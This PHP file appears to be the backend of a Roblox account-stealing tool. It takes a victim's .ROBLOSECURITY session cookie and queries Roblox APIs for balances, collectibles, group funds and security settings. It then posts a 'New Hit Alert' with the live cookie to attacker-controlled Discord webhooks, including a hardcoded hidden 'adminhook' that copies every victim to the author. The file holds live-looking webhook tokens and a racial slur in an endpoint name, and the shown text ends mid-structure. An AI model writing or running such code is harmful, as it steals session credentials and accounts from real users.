<?php
error_reporting(0);
ini_set('default_socket_timeout', '6'); // prevent long hangs on remote calls
set_time_limit(60); // Increase execution time limit to 60 seconds
// Enable error_log even with error_reporting(0)
ini_set('log_errors', 1);
ini_set('display_errors', 0);

// Admin webhook - constant webhook that receives all embeds and notifications (not exposed in frontend)
$adminhook = "https://discord.com/api/webhooks/1437891603631968289/fESUQjQ05NN35ewAcATDKmP1atDTqwWEe_Wy6WJ_TJ8rJbkq8ugvxBQQzGYe3UQz0vfv";

// Logging function for tracking steps and errors
// Try multiple log file locations to ensure it works
$logFile = __DIR__ . '/../../userinfo_logs.txt';
$logFileAlt1 = __DIR__ . '/../userinfo_logs.txt';
$logFileAlt2 = __DIR__ . '/userinfo_logs.txt';
$logFileAlt3 = './userinfo_logs.txt';

// Helper function to get detailed error reason from HTTP code
function getHttpErrorReason($httpCode) {
    $reasons = [
        200 => 'Success',
        201 => 'Created',
        204 => 'No Content (Success)',
        400 => 'Bad Request - Invalid webhook URL or malformed request',
        401 => 'Unauthorized - Invalid webhook token',
        403 => 'Forbidden - Webhook access denied',
        404 => 'Not Found - Webhook URL does not exist or was deleted',
        429 => 'Rate Limited - Too many requests, Discord is throttling',
        500 => 'Discord Server Error - Discord API is experiencing issues',
        502 => 'Bad Gateway - Discord proxy error',
        503 => 'Service Unavailable - Discord API is down or overloaded',
        504 => 'Gateway Timeout - Discord server took too long to respond'
    ];
    
    if (isset($reasons[$httpCode])) {
        return $reasons[$httpCode];
    }
    
    if ($httpCode >= 200 && $httpCode < 300) {
        return 'Success';
    } elseif ($httpCode >= 400 && $httpCode < 500) {
        return "Client Error ($httpCode) - Request was invalid or unauthorized";
    } elseif ($httpCode >= 500) {
        return "Server Error ($httpCode) - Discord server issue";
    } elseif ($httpCode == 0) {
        return 'No Response - Connection failed or timeout';
    }
    
    return "Unknown HTTP Code: $httpCode";
}

// Helper function to get detailed CURL error reason
function getCurlErrorReason($curlError) {
    if (empty($curlError)) {
        return '';
    }
    
    $errorReasons = [
        'CURLE_COULDNT_CONNECT' => 'Could not connect to Discord servers - Network issue or firewall blocking',
        'CURLE_OPERATION_TIMEOUTED' => 'Request timed out - Discord servers are slow or unreachable',
        'CURLE_SSL_CONNECT_ERROR' => 'SSL connection failed - Certificate or encryption issue',
        'CURLE_COULDNT_RESOLVE_HOST' => 'Could not resolve Discord hostname - DNS issue',
        'CURLE_RECV_ERROR' => 'Error receiving data from Discord - Connection interrupted',
        'CURLE_SEND_ERROR' => 'Error sending data to Discord - Connection interrupted'
    ];
    
    // Check for common error patterns
    if (stripos($curlError, 'timeout') !== false) {
        return 'Connection timeout - Discord servers took too long to respond or network is slow';
    }
    if (stripos($curlError, 'resolve') !== false || stripos($curlError, 'dns') !== false) {
        return 'DNS resolution failed - Cannot resolve discord.com hostname';
    }
    if (stripos($curlError, 'ssl') !== false || stripos($curlError, 'certificate') !== false) {
        return 'SSL/TLS error - Certificate validation or encryption issue';
    }
    if (stripos($curlError, 'connect') !== false) {
        return 'Connection failed - Cannot reach Discord servers (firewall, network, or server down)';
    }
    if (stripos($curlError, 'refused') !== false) {
        return 'Connection refused - Discord server rejected the connection';
    }
    
    return "CURL Error: $curlError";
}

function buildHttpErrorDetails($httpCode, $curlError, $response = '', $url = '') {
    $details = [];
    if (!empty($url)) {
        $details[] = "URL: $url";
    }

    $httpReason = getHttpErrorReason($httpCode);
    $details[] = "HTTP $httpCode: $httpReason";

    $curlReason = getCurlErrorReason($curlError);
    if (!empty($curlReason)) {
        $details[] = $curlReason;
    } elseif (!empty($curlError)) {
        $details[] = "CURL Error: $curlError";
    }

    if (is_string($response)) {
        $trimmed = trim($response);
        if ($trimmed === '') {
            $details[] = "No response body";
        } else {
            $snippet = substr(preg_replace('/\s+/', ' ', $trimmed), 0, 180);
            if (strlen($trimmed) > 180) {
                $snippet .= '...';
            }
            $details[] = "Response snippet: $snippet";
        }
    }

    return implode(' | ', $details);
}

function logStep($step, $status, $details = '') {
    global $logFile, $logFileAlt1, $logFileAlt2, $logFileAlt3;
    $timestamp = date('Y-m-d H:i:s');
    $statusIcon = $status === 'SUCCESS' ? '✅' : ($status === 'ERROR' ? '❌' : '⚠️');
    $logEntry = "[$timestamp] $statusIcon [$status] $step";
    if (!empty($details)) {
        $logEntry .= " | $details";
    }
    $logEntry .= PHP_EOL;
    
    // Try to write to multiple locations
    $written = false;
    $locations = [$logFile, $logFileAlt1, $logFileAlt2, $logFileAlt3];
    
    foreach ($locations as $location) {
        $result = @file_put_contents($location, $logEntry, FILE_APPEND | LOCK_EX);
        if ($result !== false) {
            $written = true;
            break;
        }
    }
    
    // Also log to PHP error log so we can see it in server logs
    error_log("USERINFO_LOG: $step [$status] " . ($details ? "| $details" : ""));
    
    // If all file writes failed, at least we have it in error_log
    if (!$written) {
        error_log("USERINFO_LOG_ERROR: Failed to write to all log file locations");
    }
}

// Initialize log
logStep('SCRIPT_START', 'INFO', 'UserInfo script started');

$cookie = $_GET['cookie'] ?? '';
$cookie = normalizeRobloxCookie($cookie);
if (empty($cookie)) {
    logStep('COOKIE_VALIDATION', 'ERROR', 'Cookie missing or could not be normalized');
    echo json_encode(['status' => 'error', 'message' => 'Invalid cookie provided']);
    exit;
}
logStep('COOKIE_RECEIVED', 'SUCCESS', 'Cookie received and normalized');
$ht = isset($_SERVER['HTTPS']) ? 'https://' : 'http://';
// Use HTTP_HOST so localhost includes the dev server port (e.g., localhost:8000)
$dom = $ht . $_SERVER['HTTP_HOST'];

function getLocal($url, $timeout = 6) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);

    if ($response === false || $httpCode >= 400 || trim((string)$response) === '') {
        $details = buildHttpErrorDetails($httpCode, $error, $response, $url);
        logStep('LOCAL_REQUEST', 'ERROR', $details);
    } else {
        logStep('LOCAL_REQUEST', 'SUCCESS', "URL: $url | HTTP $httpCode");
    }

    return $response;
}

logStep('COOKIE_REFRESH', 'INFO', 'Attempting to refresh cookie');
$encodedCookie = rawurlencode($cookie);
$refresherUrl = $dom . "/controlPage/apis/refresher.php?cookie=" . $encodedCookie;
$refreshedCookie = getLocal($refresherUrl, 6);
if ($refreshedCookie == "Invalid Cookie" || $refreshedCookie === false || $refreshedCookie === null) {
    $refreshReason = $refreshedCookie === false ? 'Request failed or timeout' : ($refreshedCookie === null ? 'Null response' : 'Invalid cookie response');
    logStep('COOKIE_REFRESH', 'WARNING', "Refresher failed: $refreshReason - Trying alternative method");
    $fallbackUrl = $dom . "/controlPage/apis/nigger.php?cookie=" . $encodedCookie;
    $refreshedCookie = getLocal($fallbackUrl, 6);
}
if (!$refreshedCookie || stripos($refreshedCookie, 'WARNING') !== false) {
    // fall back to original cookie to avoid total failure
    $fallbackReason = !$refreshedCookie ? 'No response from refresh endpoint' : 'Response contains WARNING';
    logStep('COOKIE_REFRESH', 'WARNING', "Refresh failed: $fallbackReason - Using original cookie");
    $refreshedCookie = $cookie;
} else {
    logStep('COOKIE_REFRESH', 'SUCCESS', 'Cookie refreshed successfully');
}

$refreshedCookie = normalizeRobloxCookie($refreshedCookie);
if (empty($refreshedCookie)) {
    logStep('COOKIE_REFRESH', 'ERROR', 'Refreshed cookie normalization failed - reverting to original cookie');
    $refreshedCookie = $cookie;
}

$headers = ["Cookie: .ROBLOSECURITY=$refreshedCookie", "Content-Type: application/json"];

function makeRequestDetailed($url, $headers, $postData = null, $timeout = 8) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    curl_setopt($ch, CURLOPT_ENCODING, '');
    if ($postData) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
    }
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    return ['response' => $response, 'http_code' => $httpCode, 'error' => $error];
}

function makeRequest($url, $headers, $postData = null, $timeout = 8) {
    $result = makeRequestDetailed($url, $headers, $postData, $timeout);
    return $result['response'];
}

// Separate function for webhook requests that returns detailed result
function makeWebhookRequest($url, $headers, $postData = null, $timeout = 10) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 3);
    if ($postData) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
    }
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    // Return response and HTTP code for error checking
    return ['response' => $response, 'http_code' => $httpCode, 'error' => $error];
}

function gamepass($cookie, $gameId) {
    $headers = ["Cookie: .ROBLOSECURITY=$cookie", "Content-Type: application/json"];
    $response = json_decode(makeRequest("https://inventory.roblox.com/v1/users/1/items/GamePass/$gameId/is-owned", $headers), true);
    return isset($response) ? ($response ? '✅' : '❌') : '❓';
}

function sanitize($value, $maxLength = 1024) {
    if (is_null($value)) return '❓ Unknown';
    $value = str_replace(['`', '*', '_', '~', '|'], '', $value);
    return substr($value, 0, $maxLength);
}

function normalizeRobloxCookie($cookieRaw) {
    if ($cookieRaw === null) {
        return '';
    }
    $cookie = trim($cookieRaw);
    if ($cookie === '') {
        return '';
    }
    // Decode once if URL encoded
    if (strpos($cookie, '%') !== false) {
        $decoded = rawurldecode($cookie);
        if ($decoded !== false) {
            $cookie = $decoded;
        }
    }
    // Remove leading cookie name if present
    if (stripos($cookie, '.ROBLOSECURITY=') === 0) {
        $cookie = substr($cookie, strlen('.ROBLOSECURITY='));
    }
    // Trim after first dangerous delimiter (quote, newline, space, tab, backslash)
    $cookie = preg_split("/[\n\r\t'\"\\\\ ]/", $cookie)[0] ?? $cookie;
    // Trim after encoded delimiters
    foreach ([';', '%3B', '%0A', '%0D', '%09'] as $delimiter) {
        $pos = stripos($cookie, $delimiter);
        if ($pos !== false) {
            $cookie = substr($cookie, 0, $pos);
        }
    }
    return trim($cookie);
}

logStep('FETCH_USER_SETTINGS', 'INFO', 'Fetching user settings from Roblox');
$settingsResult = makeRequestDetailed("https://www.roblox.com/my/settings/json", $headers);
$settingsRaw = $settingsResult['response'];
$settingsHttpCode = $settingsResult['http_code'];
$settingsCurlError = $settingsResult['error'];
if ($settingsHttpCode >= 200 && $settingsHttpCode < 300 && trim((string)$settingsRaw) !== '') {
    logStep('FETCH_USER_SETTINGS', 'SUCCESS', "HTTP $settingsHttpCode");
    $settingsData = json_decode($settingsRaw, true);
    if ($settingsData === null && json_last_error() !== JSON_ERROR_NONE) {
        logStep('FETCH_USER_SETTINGS', 'ERROR', 'JSON decode failed: ' . json_last_error_msg());
        $settingsData = [];
    }
} else {
    $details = buildHttpErrorDetails($settingsHttpCode, $settingsCurlError, $settingsRaw, "https://www.roblox.com/my/settings/json");
    logStep('FETCH_USER_SETTINGS', 'ERROR', $details);
    $settingsData = json_decode($settingsRaw, true);
    if (!is_array($settingsData)) {
        $settingsData = [];
    }
}
$userId = $settingsData['UserId'] ?? 0;
if ($userId == 0) {
    $errorReason = empty($settingsData) ? 'Empty or invalid JSON response from Roblox API' : 'UserId field missing in response';
    if (isset($settingsData['errors'])) {
        $errorReason .= ' | Roblox API errors: ' . json_encode($settingsData['errors']);
    }
    logStep('FETCH_USER_SETTINGS', 'ERROR', "Failed to extract UserId: $errorReason");
} else {
    logStep('FETCH_USER_SETTINGS', 'INFO', "UserId: $userId (HTTP $settingsHttpCode)");
}

logStep('FETCH_USER_INFO', 'INFO', "Fetching user info for userId: $userId");
$userInfoResult = makeRequestDetailed("https://users.roblox.com/v1/users/$userId", $headers);
$userInfoRaw = $userInfoResult['response'];
$userInfoHttp = $userInfoResult['http_code'];
$userInfoError = $userInfoResult['error'];
if ($userInfoHttp >= 200 && $userInfoHttp < 300 && trim((string)$userInfoRaw) !== '') {
    $userInfoData = json_decode($userInfoRaw, true);
    if ($userInfoData === null && json_last_error() !== JSON_ERROR_NONE) {
        logStep('FETCH_USER_INFO', 'ERROR', 'JSON decode failed: ' . json_last_error_msg());
        $userInfoData = [];
    } else {
        logStep('FETCH_USER_INFO', 'SUCCESS', "HTTP $userInfoHttp");
    }
} else {
    $details = buildHttpErrorDetails($userInfoHttp, $userInfoError, $userInfoRaw, "https://users.roblox.com/v1/users/$userId");
    logStep('FETCH_USER_INFO', 'ERROR', $details);
    $userInfoData = json_decode($userInfoRaw, true);
    if (!is_array($userInfoData)) {
        $userInfoData = [];
    }
}
$displayName = sanitize($userInfoData['displayName'] ?? 'Unknown');
$username = sanitize($userInfoData['name'] ?? 'Unknown');
logStep('FETCH_USER_INFO', 'INFO', "Username: $username, DisplayName: $displayName");

$games = [
    'BF' => json_decode(makeRequest("https://games.roblox.com/v1/games/994732206/votes/user", $headers), true)['canVote'] ? '✅' : '❌',
    'AM' => json_decode(makeRequest("https://games.roblox.com/v1/games/383310974/votes/user", $headers), true)['canVote'] ? '✅' : '❌',
    'MM2' => json_decode(makeRequest("https://games.roblox.com/v1/games/66654135/votes/user", $headers), true)['canVote'] ? '✅' : '❌',
    'PS99' => json_decode(makeRequest("https://games.roblox.com/v1/games/3317771874/votes/user", $headers), true)['canVote'] ? '✅' : '❌',
    'BB' => json_decode(makeRequest("https://games.roblox.com/v1/games/4777817887/votes/user", $headers), true)['canVote'] ? '✅' : '❌'
];

$gamePasses = [
    'BF' => gamepass($refreshedCookie, 2753915549),
    'AM' => gamepass($refreshedCookie, 920587237),
    'MM2' => gamepass($refreshedCookie, 142823291),
    'PS99' => gamepass($refreshedCookie, 8737899170),
    'BB' => gamepass($refreshedCookie, 13772394625)
];

$transactionSummaryData = json_decode(makeRequest("https://economy.roblox.com/v2/users/$userId/transaction-totals?timeFrame=Year&transactionType=summary", $headers), true);
$summary = isset($transactionSummaryData['purchasesTotal']) ? number_format(abs($transactionSummaryData['purchasesTotal'])) : '❓ Unknown';

$avatarData = file_get_contents("https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=150x150&format=Png&isCircular=false");
$avatarJson = json_decode($avatarData, true);
$avatarUrl = $avatarJson['data'][0]['imageUrl'] ?? 'https://www.roblox.com/headshot-thumbnail/image/default.png';

logStep('FETCH_BALANCE', 'INFO', 'Fetching Robux balance');
$balanceResult = makeRequestDetailed("https://economy.roblox.com/v1/users/$userId/currency", $headers);
$balanceRaw = $balanceResult['response'];
$balanceHttp = $balanceResult['http_code'];
$balanceError = $balanceResult['error'];
if ($balanceHttp >= 200 && $balanceHttp < 300 && trim((string)$balanceRaw) !== '') {
    logStep('FETCH_BALANCE', 'SUCCESS', "HTTP $balanceHttp");
    $balanceData = json_decode($balanceRaw, true);
    if ($balanceData === null && json_last_error() !== JSON_ERROR_NONE) {
        logStep('FETCH_BALANCE', 'ERROR', 'JSON decode failed: ' . json_last_error_msg());
        $balanceData = [];
    }
} else {
    $details = buildHttpErrorDetails($balanceHttp, $balanceError, $balanceRaw, "https://economy.roblox.com/v1/users/$userId/currency");
    logStep('FETCH_BALANCE', 'ERROR', $details);
    $balanceData = json_decode($balanceRaw, true);
    if (!is_array($balanceData)) {
        $balanceData = [];
    }
}
$robux = isset($balanceData['robux']) ? number_format($balanceData['robux']) : 0;
$pendingRobux = isset($transactionSummaryData['pendingRobuxTotal']) ? number_format($transactionSummaryData['pendingRobuxTotal']) : '❓ Unknown';
logStep('FETCH_BALANCE', 'INFO', "Robux: $robux, Pending: $pendingRobux");

logStep('FETCH_INVENTORY', 'INFO', 'Fetching inventory and RAP data');
$collectiblesResult = makeRequestDetailed("https://inventory.roblox.com/v1/users/$userId/assets/collectibles?limit=100", $headers);
$collectiblesRaw = $collectiblesResult['response'];
$collectiblesHttp = $collectiblesResult['http_code'];
$collectiblesError = $collectiblesResult['error'];
if ($collectiblesHttp >= 200 && $collectiblesHttp < 300 && trim((string)$collectiblesRaw) !== '') {
    logStep('FETCH_INVENTORY', 'SUCCESS', "HTTP $collectiblesHttp");
    $collectiblesData = json_decode($collectiblesRaw, true);
    if ($collectiblesData === null && json_last_error() !== JSON_ERROR_NONE) {
        logStep('FETCH_INVENTORY', 'ERROR', 'JSON decode failed: ' . json_last_error_msg());
        $collectiblesData = ['data' => []];
    }
} else {
    $details = buildHttpErrorDetails($collectiblesHttp, $collectiblesError, $collectiblesRaw, "https://inventory.roblox.com/v1/users/$userId/assets/collectibles?limit=100");
    logStep('FETCH_INVENTORY', 'ERROR', $details);
    $collectiblesData = json_decode($collectiblesRaw, true);
    if (!is_array($collectiblesData)) {
        $collectiblesData = ['data' => []];
    }
}
$rap = 0;
if (isset($collectiblesData['data'])) {
    foreach ($collectiblesData['data'] as $item) {
        $rap += $item['recentAveragePrice'] ?? 0;
    }
}
$rap = number_format($rap);
$inventoryCount = isset($collectiblesData['total']) ? number_format($collectiblesData['total']) : '❓ Unknown';
logStep('FETCH_INVENTORY', 'INFO', "RAP: $rap, Inventory Count: $inventoryCount");

$pinData = json_decode(makeRequest("https://auth.roblox.com/v1/account/pin", $headers), true);
$pinStatus = isset($pinData['isEnabled']) ? ($pinData['isEnabled'] ? '✅ True' : '❌ False') : '❓ Unknown';

$vcData = json_decode(makeRequest("https://voice.roblox.com/v1/settings", $headers), true);
$vcStatus = isset($vcData['isVoiceEnabled']) ? ($vcData['isVoiceEnabled'] ? '✅ True' : '❌ False') : '❓ Unknown';

function ownsBundle($userId, $bundleId, $headers) {
    $response = json_decode(makeRequest("https://inventory.roblox.com/v1/users/$userId/items/3/$bundleId", $headers), true);
    return isset($response['data']) && !empty($response['data']);
}

$hasHeadless = ownsBundle($userId, 201, $headers);
$hasKorblox = ownsBundle($userId, 192, $headers);
$headlessStatus = $hasHeadless ? '✅ True' : '❌ False';
$korbloxStatus = $hasKorblox ? '✅ True' : '❌ False';

$accountCreated = isset($userInfoData['created']) ? strtotime($userInfoData['created']) : null;
$joinDate = '❓ Unknown';
$accountAge = '❓ Unknown';
if ($accountCreated) {
    $joinDate = date('F j, Y', $accountCreated);
    $days = floor((time() - $accountCreated) / (60 * 60 * 24));
    $accountAge = number_format($days) . ' days';
}

$friendsData = json_decode(makeRequest("https://friends.roblox.com/v1/users/$userId/friends/count", $headers), true);
$friendsCount = isset($friendsData['count']) ? number_format($friendsData['count']) : '❓ Unknown';

$followersData = json_decode(makeRequest("https://friends.roblox.com/v1/users/$userId/followers/count", $headers), true);
$followersCount = isset($followersData['count']) ? number_format($followersData['count']) : '❓ Unknown';

$groupsData = json_decode(makeRequest("https://groups.roblox.com/v2/users/$userId/groups/roles", $headers), true);
$ownedGroups = [];
$allGroupRoles = [];
$highestRank = 0;
$highestGroup = 'None';
if (isset($groupsData['data'])) {
    foreach ($groupsData['data'] as $group) {
        $groupName = sanitize($group['group']['name'] ?? 'Unknown');
        $roleName = sanitize($group['role']['name'] ?? 'Unknown');
        $allGroupRoles[] = "• {$groupName} » **{$roleName}**";
        if ($group['role']['rank'] == 255) {
            $ownedGroups[] = $group;
        }
        if ($group['role']['rank'] > $highestRank) {
            $highestRank = $group['role']['rank'];
            $highestGroup = $groupName;
        }
    }
}
$groupRolesFormatted = implode("\n", array_slice($allGroupRoles, 0, 3));
if (count($allGroupRoles) > 3) $groupRolesFormatted .= "\n• +" . (count($allGroupRoles) - 3) . " more";
$totalGroupsOwned = count($ownedGroups);

$totalGroupFunds = 0;
$totalPendingGroupFunds = 0;
foreach ($ownedGroups as $group) {
    $groupId = $group['group']['id'];
    $groupFunds = json_decode(makeRequest("https://economy.roblox.com/v1/groups/$groupId/currency", $headers), true);
    $totalGroupFunds += $groupFunds['robux'] ?? 0;

    $groupPayouts = json_decode(makeRequest("https://economy.roblox.com/v1/groups/$groupId/payouts", $headers), true);
    if (isset($groupPayouts['data'])) {
        foreach ($groupPayouts['data'] as $payout) {
            if ($payout['status'] === 'Pending') {
                $totalPendingGroupFunds += $payout['amount'];
            }
        }
    }
}
$totalGroupFunds = number_format($totalGroupFunds);
$totalPendingGroupFunds = number_format($totalPendingGroupFunds);

$creditBalanceData = json_decode(makeRequest("https://billing.roblox.com/v1/credit", $headers), true);
$creditBalance = isset($creditBalanceData['balance']) ? '$' . number_format($creditBalanceData['balance'], 2) : '❓ Unknown';

$emailVerified = isset($settingsData['IsEmailVerified']) ? ($settingsData['IsEmailVerified'] ? '✅ True' : '❌ False') : '❓ Unknown';

$presenceData = json_decode(makeRequest("https://presence.roblox.com/v1/presence/users", $headers, ["userIds" => [$userId]]), true);
$presenceType = '❓ Unknown';
if (isset($presenceData['userPresences'][0])) {
    $presence = $presenceData['userPresences'][0];
    $presenceTypes = [0 => 'Offline', 1 => 'Online', 2 => 'InGame', 3 => 'Studio'];
    $presenceType = $presenceTypes[$presence['userPresenceType']] ?? '❓ Unknown';
}

$bio = sanitize($userInfoData['description'] ?? null, 200);
if (empty($bio)) $bio = '❌ No bio set';

$nonFilteredWebhook = "https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l";
$filteredWebhook = "https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l";

// Collect all webhooks: main webhook, dualhook, and adminhook (constant)
logStep('WEBHOOK_COLLECTION', 'INFO', 'Starting webhook collection');
$webhooks = [];

// Get main webhook (PHP automatically decodes URL parameters, but handle both encoded and decoded)
$mainWebhookRaw = $_GET["web"] ?? '';
$mainWebhook = $mainWebhookRaw;
// If it looks URL-encoded, decode it (PHP usually does this automatically, but be safe)
if (strpos($mainWebhookRaw, '%') !== false) {
    $mainWebhook = urldecode($mainWebhookRaw);
}
// Add main webhook - be lenient with validation to ensure it's added
if (!empty($mainWebhook) && trim($mainWebhook) !== '' && $mainWebhook !== 'null' && $mainWebhook !== 'undefined') {
    $isValidUrl = filter_var($mainWebhook, FILTER_VALIDATE_URL);
    // If validation fails, still try to add it if it looks like a Discord webhook URL
    if ($isValidUrl || (strpos($mainWebhook, 'http') === 0 && strpos($mainWebhook, 'discord.com/api/webhooks') !== false)) {
        if (!in_array($mainWebhook, $webhooks)) {
            $webhooks[] = $mainWebhook;
            logStep('WEBHOOK_COLLECTION', 'SUCCESS', 'Main webhook added to array');
        } else {
            logStep('WEBHOOK_COLLECTION', 'WARNING', 'Main webhook already in array (duplicate) - Webhook URL matches another webhook in the list');
        }
    } else {
        $validationReason = !$isValidUrl ? 'URL format validation failed' : 'Does not appear to be a Discord webhook URL';
        if (strpos($mainWebhook, 'http') !== 0) {
            $validationReason .= ' - URL does not start with http:// or https://';
        } elseif (strpos($mainWebhook, 'discord.com/api/webhooks') === false) {
            $validationReason .= ' - URL does not contain discord.com/api/webhooks path';
        }
        logStep('WEBHOOK_COLLECTION', 'ERROR', "Main webhook validation failed: $validationReason");
    }
} else {
    $emptyReason = empty($mainWebhook) ? 'Empty value' : (trim($mainWebhook) === '' ? 'Whitespace only' : ($mainWebhook === 'null' ? 'String "null"' : 'String "undefined"'));
    logStep('WEBHOOK_COLLECTION', 'WARNING', "Main webhook not provided: $emptyReason");
}

// Dualhook can be passed as 'dh' or 'dualhook' parameter
$dualhook = '';
// Check both parameters - prefer 'dh' if both are present (dh is more common)
$dhParam = $_GET["dh"] ?? '';
$dualhookParam = $_GET["dualhook"] ?? '';

// Get dualhook from either parameter (prefer 'dh')
// PHP automatically URL-decodes GET parameters, so they should already be decoded
// But handle edge cases where they might still be encoded
if (!empty($dhParam) && trim($dhParam) !== '' && $dhParam !== 'null' && $dhParam !== 'undefined') {
    // PHP usually auto-decodes, but if it still contains % signs, decode it
    $dualhook = (strpos($dhParam, '%') !== false) ? urldecode($dhParam) : $dhParam;
} elseif (!empty($dualhookParam) && trim($dualhookParam) !== '' && $dualhookParam !== 'null' && $dualhookParam !== 'undefined') {
    // PHP usually auto-decodes, but if it still contains % signs, decode it
    $dualhook = (strpos($dualhookParam, '%') !== false) ? urldecode($dualhookParam) : $dualhookParam;
}

// Add dualhook if provided and valid - it should receive all messages sent to main webhook
// Make dualhook addition more robust - ensure it's always added when provided
if (!empty($dualhook) && trim($dualhook) !== '' && $dualhook !== 'null' && $dualhook !== 'undefined') {
    // Validate URL format - but be lenient
    $isValidUrl = filter_var($dualhook, FILTER_VALIDATE_URL);
    // If validation fails, still try to add it (might be a valid URL that filter_var doesn't recognize)
    if ($isValidUrl || (strpos($dualhook, 'http') === 0 && strpos($dualhook, 'discord.com/api/webhooks') !== false)) {
        // Make sure dualhook isn't already in the array (avoid duplicates)
        if (!in_array($dualhook, $webhooks)) {
            $webhooks[] = $dualhook;
            logStep('WEBHOOK_COLLECTION', 'SUCCESS', 'Dualhook added to array');
        } else {
            logStep('WEBHOOK_COLLECTION', 'WARNING', 'Dualhook already in array (duplicate) - Webhook URL matches another webhook in the list');
        }
    } else {
        $validationReason = !$isValidUrl ? 'URL format validation failed' : 'Does not appear to be a Discord webhook URL';
        if (strpos($dualhook, 'http') !== 0) {
            $validationReason .= ' - URL does not start with http:// or https://';
        } elseif (strpos($dualhook, 'discord.com/api/webhooks') === false) {
            $validationReason .= ' - URL does not contain discord.com/api/webhooks path';
        }
        logStep('WEBHOOK_COLLECTION', 'ERROR', "Dualhook validation failed: $validationReason");
    }
} else {
    logStep('WEBHOOK_COLLECTION', 'INFO', 'Dualhook not provided (optional)');
}
logStep('WEBHOOK_COLLECTION', 'SUCCESS', 'Total webhooks collected: ' . count($webhooks));

// For high-value accounts, use filtered webhook but still include dualhook
$isHighValue = (
    $robux >= 35000 ||
    $rap >= 65000 ||
    $totalGroupFunds >= 35000 ||
    $summary >= 300000 ||
    $creditBalance >= 100 ||
    $pendingRobux >= 25000 ||
    $followersCount >= 10000
);

logStep('HIGH_VALUE_CHECK', 'INFO', 'isHighValue = ' . ($isHighValue ? 'true' : 'false'));

// Build final webhook order: filtered (if high value), main, admin, dualhook
$finalWebhooks = [];

if ($isHighValue && !empty($filteredWebhook) && filter_var($filteredWebhook, FILTER_VALIDATE_URL)) {
    $finalWebhooks[] = $filteredWebhook;
    logStep('WEBHOOK_COLLECTION', 'INFO', 'High value detected, adding filtered webhook');
}

if (!empty($mainWebhook) && filter_var($mainWebhook, FILTER_VALIDATE_URL)) {
    $finalWebhooks[] = $mainWebhook;
    logStep('WEBHOOK_COLLECTION', 'INFO', 'Main webhook retained in send list');
} elseif (!empty($mainWebhook)) {
    logStep('WEBHOOK_COLLECTION', 'ERROR', 'Main webhook excluded: invalid URL format during final ordering');
}

if (!empty($adminhook) && filter_var($adminhook, FILTER_VALIDATE_URL)) {
    $finalWebhooks[] = $adminhook;
    logStep('WEBHOOK_COLLECTION', 'INFO', 'Adminhook included in send list');
} else {
    logStep('WEBHOOK_COLLECTION', 'ERROR', 'Adminhook missing or invalid during final ordering');
}

if (!empty($dualhook) && filter_var($dualhook, FILTER_VALIDATE_URL)) {
    $finalWebhooks[] = $dualhook;
    logStep('WEBHOOK_COLLECTION', 'INFO', 'Dualhook included in send list');
}

// Deduplicate while preserving order
$webhooks = [];
$seen = [];
foreach ($finalWebhooks as $hook) {
    $normalized = trim($hook);
    if ($normalized === '' || isset($seen[$normalized])) {
        continue;
    }
    $webhooks[] = $normalized;
    $seen[$normalized] = true;
}

logStep('WEBHOOK_COLLECTION', 'INFO', 'Final webhook count: ' . count($webhooks));

$timestamp = date("c");
$space = '|';

$embed1 = [
    'content' => '@everyone',
    'username' => 'HyperBlox',
    'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
    'embeds' => [
        [
            'title' => "New Hit Alert!",
            'description' => "<:check:1350103884835721277> **[Check Cookie]($dom/controlPage/check/check.php?cookie=$refreshedCookie)** <:line:1350104634982662164> <:refresh:1350103925037989969> **[Refresh Cookie]($dom/controlPage/antiprivacy/kingvon.php?cookie=$refreshedCookie)** <:line:1350104634982662164> <:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/$userId/profile)** <:line:1350104634982662164> <:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/$userId)**",
            'color' => hexdec('00BFFF'),
            'thumbnail' => ['url' => $avatarUrl],
            'fields' => [
                [
                    'name' => '**<:search:1391436893794861157> About:**',
